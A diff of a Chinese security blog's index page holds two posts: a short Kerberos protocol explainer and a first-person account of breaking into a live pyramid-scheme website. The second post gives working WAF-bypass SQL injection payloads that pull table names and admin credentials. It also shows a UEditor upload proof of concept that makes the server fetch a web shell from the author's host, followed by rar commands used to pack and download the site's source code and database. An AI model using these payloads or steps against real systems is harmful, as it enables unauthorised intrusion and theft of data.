@@ -2,43 +2,53 @@
 
 
 <html lang="zh-CN">
-
-
-<head>
-  <meta charset="utf-8" />
-    
-  <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
   
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-  <title>
-     GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……
-  </title>
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title> Guoker&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-ayer">
-  
-  <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
-  
-  
+      
+      <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
+       
 <link rel="stylesheet" href="/dist/main.css">
 
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
-
-  
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
 <link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
 
-  
-  
-<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
 
-  
-  
-
-  
-
-<link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    <link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
 </head>
-
+  </html>
 </html>
+
 
 <body>
   <div id="app">
@@ -96,6 +106,50 @@
   
 <div id="main">
   <section class="outer">
+  
+  
+  
+
+<div class="notice" style="margin-top:50px">
+    <i class="ri-heart-fill"></i>
+    <div class="notice-content" id="broad"></div>
+</div>
+<script type="text/javascript">
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("broad").innerHTML = data.hitokoto;
+        })
+        .catch(console.error)
+</script>
+
+<style>
+    .notice {
+        padding: 20px;
+        border: 1px dashed #e6e6e6;
+        color: #969696;
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        background: #fbfbfb50;
+        border-radius: 10px;
+    }
+
+    .notice i {
+        float: left;
+        color: #999;
+        font-size: 16px;
+        padding-right: 10px;
+        vertical-align: middle;
+        margin-top: -2px;
+    }
+
+    .notice-content {
+        display: initial;
+        vertical-align: middle;
+    }
+</style>
+  
   <article class="articles">
     
     
@@ -118,6 +172,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -125,7 +180,33 @@
   <time datetime="2019-10-23T16:00:00.000Z" itemprop="datePublished">2019-10-24</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近这段时间通过阅读相关资料初步了解到了kerberos认证协议的相关知识，因此有了此文，记录我对该认证过程的一些理解，文中所写的都是简化过后的过程，方便记忆而已，如果需要深入了解各阶段发生了什么请勿参考此文。因为是自己理解，如有问题，请指正。</p>
+<h1 id="相关名词"><a href="#相关名词" class="headerlink" title="相关名词"></a>相关名词</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Client-A ：客户机</span><br><span class="line">KDC：域控</span><br><span class="line">Server-B：服务器</span><br><span class="line">AS ：认证服务器</span><br><span class="line">TGT ：票据许可票据</span><br><span class="line">TGS ：票据授权服务器</span><br><span class="line">ST ：服务许可票据</span><br><span class="line">SessionKey ：会话密钥</span><br><span class="line">NTLM Hash ：密码散列</span><br></pre></td></tr></table></figure>
+<h1 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h1><p>将总体简化，并分为三个阶段，每个阶段有两个步骤</p>
+<p><img src="https://photo.o0o0.club/_Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1574065802479.png"></p>
+<h2 id="第一阶段-获取票据许可票据-TGT"><a href="#第一阶段-获取票据许可票据-TGT" class="headerlink" title="第一阶段:获取票据许可票据(TGT)"></a>第一阶段:获取票据许可票据(TGT)</h2><p>客户端先用NTLM Hash加密一个时间戳然后与Client-A的信息和一个随机数一起组合成AS_REQ发送给认证服务器(AS)，AS收到AS_REQ后先获取了Client-A的信息，然后在数据库中验证用户的访问权限,生成票据许可票据(TGT)和会话密钥(SessionKey-1)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 0x1. Client-A --&gt; KDC[AS]</span><br><span class="line">请求票据许可</span><br><span class="line"></span><br><span class="line"> 0x2. Client-A &lt;-- KDC[AS]</span><br><span class="line">返回TGT+SessionKey1</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二阶段-获取服务票-Ticket"><a href="#第二阶段-获取服务票-Ticket" class="headerlink" title="第二阶段:获取服务票(Ticket)"></a>第二阶段:获取服务票(Ticket)</h2><p>Client-A对收到的报文解密，然后将TGT以及包含用户名称、网络地址、时间的鉴别符发往票据授权服务器(TGS)，TGS对TGT和鉴别符进行解密，认证通过后返回服务票(Ticket)和SessionKey-2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x3. Client-A --&gt; KDC[TGS]</span><br><span class="line">请求服务许可</span><br><span class="line">PS：黄金票据攻击发送在此步骤</span><br><span class="line"></span><br><span class="line">0x4. Client-A &lt;-- KDC[TGS]</span><br><span class="line">返回ST+SessionKey2</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三阶段-获得服务"><a href="#第三阶段-获得服务" class="headerlink" title="第三阶段:获得服务"></a>第三阶段:获得服务</h2><p>Client-A将Ticket和认证消息发送给Server-B，Server-B验证Ticket和认证信息中的相匹配，则允许Client-A访问服务，如果需要双向鉴别，则Server-B返回认证信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x5. Client-A --&gt; Server-B</span><br><span class="line">请求服务</span><br><span class="line">PS:白银票据攻击发生在此步骤</span><br><span class="line"></span><br><span class="line">0x6. Client-A &lt;-- Server-B</span><br><span class="line">允许访问或提供服务器鉴别符</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="跨域认证"><a href="#跨域认证" class="headerlink" title="跨域认证"></a>跨域认证</h1><p>Client-A、KDC-A、Server-B、KDC-B</p>
+<p><img src="https://photo.o0o0.club/_Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1574065857800.png"></p>
+<h2 id="获取TGT"><a href="#获取TGT" class="headerlink" title="获取TGT"></a>获取TGT</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Client-A --&gt; KDC-A[AS]</span><br><span class="line">请求认证</span><br><span class="line"></span><br><span class="line">Client-A --&gt; KDC-A[AS]</span><br><span class="line">返回TGT+SessionKey1</span><br></pre></td></tr></table></figure>
+<h2 id="获取Ticket"><a href="#获取Ticket" class="headerlink" title="获取Ticket"></a>获取Ticket</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Client-A --&gt; KDC-A[TGS]</span><br><span class="line">跨域请求Server-B</span><br><span class="line"></span><br><span class="line">KDC-A[TGS] --&gt; KDC-B[TGS]</span><br><span class="line">KDC-A验证通过，请求KDC-B</span><br><span class="line"></span><br><span class="line">KDC-A[TGS] &lt;-- KDC-B[TGS]</span><br><span class="line">验证通过，返回Ticket+Session2</span><br><span class="line"></span><br><span class="line">Client-A &lt;-- KDC-A[TGS]</span><br><span class="line">返回Ticket+SessionKey2</span><br></pre></td></tr></table></figure>
+<h2 id="访问资源"><a href="#访问资源" class="headerlink" title="访问资源"></a>访问资源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Client-A --&gt; Server-B</span><br><span class="line">请求服务</span><br><span class="line"></span><br><span class="line">Client-A &lt;-- Server-B</span><br><span class="line">允许访问或提供服务器鉴别符</span><br></pre></td></tr></table></figure>
+
+<h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h2 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h2> 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -138,7 +219,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -159,6 +240,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -166,7 +248,82 @@
   <time datetime="2019-09-30T16:00:00.000Z" itemprop="datePublished">2019-10-01</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>如题，由于是在已知有一处sql注入的情况下才接手进行的后续操作，因此前面信息搜集则一笔带过。</p>
+<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>目标是个本地的传销站点其大致信息为IIS+ASP.NET+安全狗、腾讯云。</p>
+<h1 id="三、Bypass-Sql"><a href="#三、Bypass-Sql" class="headerlink" title="三、Bypass Sql"></a>三、Bypass Sql</h1><h2 id="3-1-Fuzz"><a href="#3-1-Fuzz" class="headerlink" title="3.1 Fuzz"></a>3.1 Fuzz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">空格		error</span><br><span class="line">加号		未拦截</span><br><span class="line">等号		error</span><br><span class="line">单引号		error</span><br><span class="line">双引号		未拦截</span><br><span class="line">双括号		未拦截</span><br><span class="line">+select		error</span><br><span class="line">%0bselect	未拦截</span><br><span class="line">%0bselect%0buser%0bfrom	未拦截</span><br><span class="line">%0bselect%0buser%0bfrom%0badmin	拦截</span><br><span class="line">convert()	未拦截</span><br></pre></td></tr></table></figure>
+<p>根据如上测试可以看出程序本身也有过滤，error为程序自身的过滤。可以利用IIS处理%符号的机制绕过部分符号，例如空格使用%0b 加号使用%2b等。再根据测试的结果，可以先利用convert转换报错获取一部分信息。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569954242686.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goodscontent.aspx?gid=convert(int,@@version)#版本信息</span><br><span class="line">goodscontent.aspx?gid=convert(int,db_name())#数据库信息</span><br><span class="line">goodscontent.aspx?gid=convert(int,user_name())#当前数据库用户</span><br><span class="line">……</span><br><span class="line">tips：可以通过遍历db_name(1)中的数字获取其他库名</span><br></pre></td></tr></table></figure>
+<p>得到以下信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ASP.NET 版本：Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.36400</span><br><span class="line">数据库版本：Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)</span><br><span class="line">用户名：sa</span><br><span class="line">计算机名：10_*_76_*\SQLEXPRESS      10.*.76.*</span><br><span class="line">当前库：pan20170823</span><br><span class="line">所有库名：</span><br><span class="line">pan20170823</span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line">ReportServer$SQLEXPRESS</span><br><span class="line">ReportServer$SQLEXPRESSTempDB</span><br></pre></td></tr></table></figure>
+<p>再往下就是获取表的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goodscontent.aspx?gid=CONVERT(INT,(CHAR(58)%2bCHAR(58)%2b(SELECT%0btop%0b1%0bCAST(COUNT(*)%0bAS%0bnvarchar(4000))%0bFROM%0binformation_schema.TABLES%0b)%2bCHAR(58)%2bCHAR(58)))#获取表总个数</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569953878104.png"><br>由于我只会简单的select from因此始终无法获取表名，如果有其他姿势还望给科普下。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569953991643.png"></p>
+<h2 id="3-2-万金油"><a href="#3-2-万金油" class="headerlink" title="3.2 万金油"></a>3.2 万金油</h2><p>此时陷入僵局，后来想起在404大佬的一篇bypass安全狗的文章中提到过在mssql中注释加换行同样成立，遂构造之。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goodscontent.aspx?gid<span class="operator">=</span><span class="comment">--/*%0a(select%0btop%0b1%0btable_name%0bFROM%0binformation_schema.tables%0b)--%20*/</span></span><br><span class="line">PS:由于注入点已经使用了<span class="keyword">convert</span>做了数据转换，后续直接防入查询即可</span><br></pre></td></tr></table></figure>
+<p>获取到第一个表名：jsrecord</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569954458132.png"><br>由于还是没能绕过单引号和等号，我始终用不了not in与for xml path来爆后续的表名，这又触及到了我知识盲区，因此只好查阅大量文章案例，最终构造出如下语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(SELECT%0bTOP%0b1%0btable_name%0bFROM%0binformation_schema.tables%0bWHERE%0btable_name%0bNOT%0bIN(SELECT%0bTOP%0b11%0btable_name%0bFROM%0binformation_schema.columns))--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569955516974.png"><br>此时只需要遍历top的数值即可，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(SELECT%0bTOP%0b1%0btable_name%0bFROM%0binformation_schema.tables%0bWHERE%0btable_name%0bNOT%0bIN(SELECT%0bTOP%0b80%0btable_name%0bFROM%0binformation_schema.columns))--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569955648051.png"></p>
+<p>通过不断的遍历数值发现还是存在问题，举个例子，即 1-20、200-209，334-345返回同一个表名，存在大量重复与无序的情况，但可以通过burp中intruder-&gt;Grep-Extact功能来解决，操作如下：<br>首先设置好intruder对001-600进行遍历（超过600多后就没什么内容了）</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956551272.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956753730.png" alt="enter description here"><br>然后使用Grep-Extact提取表名。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956992567.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957073763.png"></p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957147522.png"><br>保存结果后去重即可。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957280428.png"><br>和前面获取到的表总个数是一致的。</p>
+<p>解下来就是获取memberadmin表中的列名与内容，但在此之前我还是习惯性的看了下后台的网页源代码。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957665687.png"></p>
+<p>如图，盲猜列名txt_nickname、nickname、txt_password、password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(select%0btop%0b1%0bnickname%0bfrom%0bmemberadmin)--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957913210.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goodscontent.aspx?gid=--/*%0a(select%0btop%0b1%0bpassword%0bfrom%0bmemberadmin)--%20*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569958051976.png"></p>
+<h1 id="三、后台getshell"><a href="#三、后台getshell" class="headerlink" title="三、后台getshell"></a>三、后台getshell</h1><p>登陆后台</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569958424253.png"></p>
+<p>经测试后发现信息管理处可以发布咨询，上传图片。通过修改去掉filename=”1.aspx”中的双引号绕过安全狗，但无法绕过程序自身的检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=xss.jpg .aspx</span><br></pre></td></tr></table></figure>
+<p>不过得知上传组件为ueditor，且.net版本存在上传漏洞<br>poc如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://***/***/net/controller.ashx?action=catchimage&quot;</span><span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>并在自己的服务器上准备好shell（注意过狗），名称为a.gif,然后填入shell地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://o0o0.club/a.gif?.aspx</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569959552187.png"><br>提交后即可得到shell路径</p>
+<h1 id="四、打包源码与数据库"><a href="#四、打包源码与数据库" class="headerlink" title="四、打包源码与数据库"></a>四、打包源码与数据库</h1><p>在有了shell之后要做的事情就更明确了，即是打包源码与数据库，由于只需要这两样操作，相对于不需要太大的权限，避免操作不当触发警告。因此我选择先通过shell来进行打包操作。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003081405.png"><br><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003154844.png"></p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>这里利用的是自行上传的rar.exe来分卷打包源码，在此之前尝试过7z.exe（目标服务器上已安装）、makecab 但效果并不理想，姿势不够还望科普。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rar.exe a -r -v50m -m5 pan20170823 *.*</span><br><span class="line">#a 压缩</span><br><span class="line">#-r 打包子目录</span><br><span class="line">#-v 分卷大小</span><br><span class="line">#-m 压缩等级</span><br><span class="line">#pan20170823目标目录</span><br><span class="line">#*.* 打包后文件名为 pan20170823.part*.rar</span><br></pre></td></tr></table></figure>
+<p>最终以每秒100k的速度下载完成。<br><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003537734.png"></p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>略过，后台自带备份功能</p>
+<p>坑点：后台的备份文件后缀为zip，下载回来总是提示文件损坏，一直以为备份功能有问题，后来发现文件头是TAPE。。。。</p>
+<h1 id="五、本地搭建"><a href="#五、本地搭建" class="headerlink" title="五、本地搭建"></a>五、本地搭建</h1><p>本地搭建的环境为 Windows server 2012+IIS8+SQL Server 2008,简单讲讲0.0</p>
+<h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h2><p>安装过程略过<br>导入数据</p>
+<p>新建数据库，然后通过原设备还原数据</p>
